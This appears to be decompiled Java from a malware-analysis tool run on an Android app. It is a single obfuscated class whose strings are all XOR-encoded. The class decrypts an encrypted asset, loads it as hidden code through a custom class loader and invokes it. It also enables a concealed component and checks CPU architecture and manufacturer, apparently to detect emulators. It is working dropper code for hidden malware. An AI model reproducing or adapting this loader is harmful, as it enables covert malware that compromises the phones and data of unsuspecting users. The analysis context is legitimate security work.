package co.ec.cnsyn.codecatcher;

import android.content.ComponentName;
import android.content.Context;
import android.content.res.AssetManager;
import android.os.Build;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Locale;

/* loaded from: /home/mobsf/.MobSF/uploads/753876b01b6895c68ea4728422f0fc34/classes.dex */
public class ba5sou3sioz1kaiD {
    public static String Aewaeyae8cahghae() {
        byte[] bArr = new byte[11];
        bArr[0] = 113;
        bArr[1] = -80;
        bArr[2] = -103;
        bArr[3] = 43;
        bArr[4] = -74;
        bArr[5] = -98;
        bArr[6] = 70;
        bArr[7] = -81;
        bArr[8] = -83;
        bArr[9] = 78;
        bArr[10] = -46;
        byte[] bArr2 = {83, -114, -88, 25, -103, -103, -79, 100, -6, -16, -19, -52, 2, 102, -73, -59};
        for (int i3 = 3; i3 < 9; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 3) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[6];
        for (int i4 = 0; i4 < 6; i4++) {
            bArr3[i4] = bArr[3 + i4];
        }
        return new String(bArr3);
    }

    public static String AiD7Sheghotoonoo() {
        byte[] bArr = new byte[29];
        bArr[0] = -103;
        bArr[1] = -50;
        bArr[2] = -103;
        bArr[3] = 101;
        bArr[4] = 115;
        bArr[5] = 117;
        bArr[6] = -96;
        bArr[7] = 26;
        bArr[8] = 33;
        bArr[9] = -105;
        bArr[10] = -59;
        bArr[11] = -104;
        bArr[12] = -100;
        bArr[13] = 105;
        bArr[14] = -54;
        bArr[15] = -47;
        bArr[16] = 33;
        bArr[17] = -70;
        bArr[18] = -106;
        bArr[19] = -10;
        bArr[20] = 115;
        bArr[21] = 111;
        bArr[22] = 5;
        bArr[23] = 8;
        bArr[24] = -11;
        bArr[25] = -2;
        bArr[26] = -21;
        bArr[27] = 108;
        bArr[28] = -124;
        byte[] bArr2 = {26, 27, -42, 117, 74, -14, Byte.MIN_VALUE, -32, -24, 12, -72, -65, 64, -42, -33, -104};
        for (int i3 = 4; i3 < 22; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 4) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[18];
        for (int i4 = 0; i4 < 18; i4++) {
            bArr3[i4] = bArr[4 + i4];
        }
        return new String(bArr3);
    }

    public static String Oogh1shahsh7ojah() {
        byte[] bArr = new byte[15];
        bArr[0] = 85;
        bArr[1] = -9;
        bArr[2] = 13;
        bArr[3] = 8;
        bArr[4] = 111;
        bArr[5] = -106;
        bArr[6] = -74;
        bArr[7] = 109;
        bArr[8] = -15;
        bArr[9] = -8;
        bArr[10] = 118;
        bArr[11] = 117;
        bArr[12] = 0;
        bArr[13] = -3;
        bArr[14] = -81;
        byte[] bArr2 = {3, -7, -41, 9, -75, -99, 14, 21, -49, -111, 83, -27, 85, 123, -123, -19};
        for (int i3 = 4; i3 < 11; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 4) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[7];
        for (int i4 = 0; i4 < 7; i4++) {
            bArr3[i4] = bArr[4 + i4];
        }
        return new String(bArr3);
    }

    public static boolean OuGhohso4ca4xee7() {
        String str = Build.CPU_ABI;
        if (!ieduyuFok9vongie().equals(str) && !Aewaeyae8cahghae().equals(str)) {
            for (String str2 : Build.SUPPORTED_ABIS) {
                if (ieduyuFok9vongie().equals(str2) || Aewaeyae8cahghae().equals(str2)) {
                    return true;
                }
            }
            String lowerCase = Build.MANUFACTURER.toLowerCase(Locale.ROOT);
            if (lowerCase != null && !lowerCase.isEmpty() && !lowerCase.contains(yieCh1ie6ool6eiw()) && !lowerCase.contains(bee5aijieb2uo2aZ()) && !lowerCase.contains(eeR2zeishah7vohm())) {
                return false;
            }
        }
        return true;
    }

    public static byte[] Pieph1deinge3fo1(InputStream inputStream) throws Exception {
        byte[] bArr = new byte[inputStream.available()];
        inputStream.read(bArr);
        inputStream.close();
        naeYoth3oocahqu0(bArr);
        return bArr;
    }

    public static void aow9cho1ahCoap4o(Context context) {
        Class loadClass;
        try {
            context.getAssets();
            ByteBuffer wrap = ByteBuffer.wrap(ohp9cee7ohth0Quu(context.getAssets()));
            ClassLoader classLoader = context.getClassLoader();
            aeP2aegem3ien3yi.yieCh1ie6ool6eiw();
            loadClass = LaiW8neishov5phe.yieCh1ie6ool6eiw(wrap, classLoader).loadClass(johP3iepo3obozaa());
            loadClass.getMethod(Oogh1shahsh7ojah(), Context.class, String.class).invoke(null, context, "sljlwp0nwlsnql1q/g9mxbcgv");
            loadClass.getMethod(AiD7Sheghotoonoo(), Context.class, String.class).invoke(null, context, "com.zmh.wkjwqvogg.App");
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, "com.zmh.wkjwqvogg.ebCMUgoC"), 1, 1);
        } catch (Exception e3) {
            throw new RuntimeException(e3);
        }
    }

    public static String bee5aijieb2uo2aZ() {
        byte[] bArr = new byte[17];
        bArr[0] = 42;
        bArr[1] = -85;
        bArr[2] = -11;
        bArr[3] = 47;
        bArr[4] = -79;
        bArr[5] = 103;
        bArr[6] = 48;
        bArr[7] = 99;
        bArr[8] = -116;
        bArr[9] = 18;
        bArr[10] = -54;
        bArr[11] = Byte.MIN_VALUE;
        bArr[12] = 21;
        bArr[13] = -127;
        bArr[14] = -99;
        bArr[15] = -65;
        bArr[16] = -107;
        byte[] bArr2 = {18, 94, 8, -30, 125, -67, -18, Byte.MAX_VALUE, 86, -97, -80, -78, 58, -97, 80, -60};
        for (int i3 = 5; i3 < 12; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 5) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[7];
        for (int i4 = 0; i4 < 7; i4++) {
            bArr3[i4] = bArr[5 + i4];
        }
        return new String(bArr3);
    }

    public static String eeR2zeishah7vohm() {
        byte[] bArr = new byte[18];
        bArr[0] = -127;
        bArr[1] = -92;
        bArr[2] = -22;
        bArr[3] = 42;
        bArr[4] = 52;
        bArr[5] = -58;
        bArr[6] = -68;
        bArr[7] = 31;
        bArr[8] = 120;
        bArr[9] = -55;
        bArr[10] = -61;
        bArr[11] = -13;
        bArr[12] = -96;
        bArr[13] = 62;
        bArr[14] = 94;
        bArr[15] = 38;
        bArr[16] = -17;
        bArr[17] = -23;
        byte[] bArr2 = {77, 81, -88, -39, 109, 17, -86, -63, -110, 118, 117, -107, -109, -78, 122, 101};
        for (int i3 = 3; i3 < 10; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 3) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[7];
        for (int i4 = 0; i4 < 7; i4++) {
            bArr3[i4] = bArr[3 + i4];
        }
        return new String(bArr3);
    }

    public static String ieduyuFok9vongie() {
        byte[] bArr = new byte[8];
        bArr[0] = 48;
        bArr[1] = 20;
        bArr[2] = 7;
        bArr[3] = -127;
        bArr[4] = 33;
        bArr[5] = 35;
        bArr[6] = 4;
        bArr[7] = -29;
        byte[] bArr2 = {Byte.MAX_VALUE, -71, 23, 79, 26, -93, 44, -99, -7, 72, -20, -76, 105, -93, 74, 94};
        for (int i3 = 2; i3 < 5; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 2) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[3];
        for (int i4 = 0; i4 < 3; i4++) {
            bArr3[i4] = bArr[2 + i4];
        }
        return new String(bArr3);
    }

    public static String johP3iepo3obozaa() {
        byte[] bArr = new byte[61];
        bArr[0] = 74;
        bArr[1] = 66;
        bArr[2] = -108;
        bArr[3] = -96;
        bArr[4] = 94;
        bArr[5] = 23;
        bArr[6] = 1;
        bArr[7] = -96;
        bArr[8] = 83;
        bArr[9] = 14;
        bArr[10] = -115;
        bArr[11] = 28;
        bArr[12] = -56;
        bArr[13] = -23;
        bArr[14] = -60;
        bArr[15] = 126;
        bArr[16] = -108;
        bArr[17] = 84;
        bArr[18] = 92;
        bArr[19] = -97;
        bArr[20] = 119;
        bArr[21] = 77;
        bArr[22] = -118;
        bArr[23] = -80;
        bArr[24] = 79;
        bArr[25] = 0;
        bArr[26] = -62;
        bArr[27] = 23;
        bArr[28] = -46;
        bArr[29] = -15;
        bArr[30] = -39;
        bArr[31] = 111;
        bArr[32] = -117;
        bArr[33] = 66;
        bArr[34] = 16;
        bArr[35] = -122;
        bArr[36] = 113;
        bArr[37] = 75;
        bArr[38] = -116;
        bArr[39] = -73;
        bArr[40] = 78;
        bArr[41] = 2;
        bArr[42] = -45;
        bArr[43] = 9;
        bArr[44] = -43;
        bArr[45] = -6;
        bArr[46] = -121;
        bArr[47] = 74;
        bArr[48] = -99;
        bArr[49] = 73;
        bArr[50] = 62;
        bArr[51] = -122;
        bArr[52] = Byte.MAX_VALUE;
        bArr[53] = 91;
        bArr[54] = -102;
        bArr[55] = -79;
        bArr[56] = -78;
        bArr[57] = 18;
        bArr[58] = -109;
        bArr[59] = -22;
        bArr[60] = -54;
        byte[] bArr2 = {-61, 60, 99, -93, 121, -80, -120, -87, 14, -8, 49, 114, -23, 30, 63, -1};
        for (int i3 = 7; i3 < 56; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 7) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[49];
        for (int i4 = 0; i4 < 49; i4++) {
            bArr3[i4] = bArr[7 + i4];
        }
        return new String(bArr3);
    }

    public static void naeYoth3oocahqu0(byte[] bArr) {
        byte[] bytes = "ecwpcv70jcibydeqfhqqejz8lx34ey0t8fyvgbsxtrexltbf03lprqdzahlcoffu".getBytes(StandardCharsets.UTF_8);
        for (int i3 = 0; i3 < bArr.length; i3++) {
            bArr[i3] = (byte) (bArr[i3] ^ bytes[i3 % bytes.length]);
        }
    }

    public static byte[] ohp9cee7ohth0Quu(AssetManager assetManager) throws Exception {
        return Pieph1deinge3fo1(assetManager.open("zhxgj0tqqdmdct8o"));
    }

    public static String yieCh1ie6ool6eiw() {
        byte[] bArr = new byte[17];
        bArr[0] = -24;
        bArr[1] = -77;
        bArr[2] = -10;
        bArr[3] = 41;
        bArr[4] = 35;
        bArr[5] = 98;
        bArr[6] = -8;
        bArr[7] = -66;
        bArr[8] = -124;
        bArr[9] = -125;
        bArr[10] = 89;
        bArr[11] = -118;
        bArr[12] = 63;
        bArr[13] = -100;
        bArr[14] = 120;
        bArr[15] = -24;
        bArr[16] = -122;
        byte[] bArr2 = {-27, -19, 61, -8, 80, -11, 28, -106, -45, 119, -96, 49, 51, 32, -125, -62};
        for (int i3 = 8; i3 < 15; i3++) {
            bArr[i3] = (byte) (bArr2[(i3 - 8) % 16] ^ bArr[i3]);
        }
        byte[] bArr3 = new byte[7];
        for (int i4 = 0; i4 < 7; i4++) {
            bArr3[i4] = bArr[8 + i4];
        }
        return new String(bArr3);
    }
}
